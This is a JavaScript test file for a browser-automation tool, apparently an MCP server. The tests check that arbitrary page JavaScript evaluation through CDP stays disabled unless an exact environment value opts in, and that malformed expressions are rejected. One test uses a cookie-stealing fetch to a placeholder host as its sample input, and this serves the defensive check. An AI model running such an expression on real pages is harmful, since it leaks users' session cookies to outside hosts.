import { describe, it } from 'node:test';
import assert from 'node:assert/strict';
import {
  ARBITRARY_PAGE_JS_ACK,
  ARBITRARY_PAGE_JS_ENV,
  requireArbitraryPageJs,
} from '../src/capabilities.js';
import { uiEvaluate } from '../src/core/ui.js';
import { registerUiTools } from '../src/tools/ui.js';
import { getRegisteredHandler } from '../src/cli/router.js';
import '../src/cli/commands/ui.js';

const enabledEnv = { [ARBITRARY_PAGE_JS_ENV]: ARBITRARY_PAGE_JS_ACK };

function registeredUiEvaluate(deps) {
  const tools = new Map();
  const server = {
    tool(name, description, schema, handler) {
      tools.set(name, { description, schema, handler });
    },
  };
  registerUiTools(server, deps);
  return tools.get('ui_evaluate');
}

describe('arbitrary page JavaScript capability', () => {
  it('is denied by default before CDP evaluation', async () => {
    let evaluated = false;

    await assert.rejects(
      () => uiEvaluate({
        expression: "fetch('https://example.invalid/?cookie=' + document.cookie)",
        _deps: { env: {}, evaluate: async () => { evaluated = true; } },
      }),
      new RegExp(`${ARBITRARY_PAGE_JS_ENV}=${ARBITRARY_PAGE_JS_ACK}`),
    );

    assert.equal(evaluated, false);
  });

  it('rejects truthy and near-match configuration values', () => {
    for (const value of ['1', 'true', ARBITRARY_PAGE_JS_ACK.toLowerCase(), `${ARBITRARY_PAGE_JS_ACK} `]) {
      assert.throws(() => requireArbitraryPageJs({ [ARBITRARY_PAGE_JS_ENV]: value }), /disabled/);
    }
  });

  it('allows deliberate opt-in and preserves the exact expression', async () => {
    const expression = "(() => ({ quote: '\"', template: `\${notExecuted}` }))()";
    let received;

    const result = await uiEvaluate({
      expression,
      _deps: {
        env: enabledEnv,
        evaluate: async (value) => { received = value; return 42; },
      },
    });

    assert.equal(received, expression);
    assert.deepEqual(result, { success: true, result: 42 });
  });

  it('rejects malformed expressions before CDP evaluation when enabled', async () => {
    let calls = 0;
    const deps = { env: enabledEnv, evaluate: async () => { calls++; } };

    await assert.rejects(() => uiEvaluate({ expression: '', _deps: deps }), /non-empty string/);
    await assert.rejects(() => uiEvaluate({ expression: '   ', _deps: deps }), /non-empty string/);
    await assert.rejects(() => uiEvaluate({ expression: 123, _deps: deps }), /non-empty string/);
    assert.equal(calls, 0);
  });

  it('exposes the risk and default denial through the MCP tool boundary', async () => {
    const tool = registeredUiEvaluate({ env: {}, evaluate: async () => assert.fail('must not evaluate') });
    const response = await tool.handler({ expression: 'globalThis.compromised = true' });
    const body = JSON.parse(response.content[0].text);

    assert.match(tool.description, /DANGEROUS.*Disabled by default/);
    assert.equal(response.isError, true);
    assert.equal(body.success, false);
    assert.match(body.error, new RegExp(ARBITRARY_PAGE_JS_ENV));
  });

  it('preserves MCP tool behavior after deliberate opt-in', async () => {
    const tool = registeredUiEvaluate({ env: enabledEnv, evaluate: async (expression) => expression.length });
    const response = await tool.handler({ expression: '1 + 1' });
    const body = JSON.parse(response.content[0].text);

    assert.equal(response.isError, undefined);
    assert.deepEqual(body, { success: true, result: 5 });
  });

  it('denies the actual CLI ui eval handler before CDP access', async () => {
    let evaluated = false;
    const handler = getRegisteredHandler('ui', 'eval');

    await assert.rejects(
      () => handler({}, ['globalThis.compromised', '=', 'true'], {
        env: {},
        evaluate: async () => { evaluated = true; },
      }),
      new RegExp(ARBITRARY_PAGE_JS_ENV),
    );

    assert.equal(evaluated, false);
  });
});
